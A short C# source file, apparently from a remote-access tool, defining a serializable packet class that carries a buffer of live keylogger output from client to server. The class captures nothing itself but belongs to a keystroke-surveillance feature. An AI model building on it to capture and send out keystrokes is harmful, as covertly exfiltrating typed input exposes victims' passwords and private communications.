﻿using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetKeyloggerLiveResponse : IPacket
    {
        public string Buffer { get; set; }

        public GetKeyloggerLiveResponse(string buffer)
        {
            this.Buffer = buffer;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}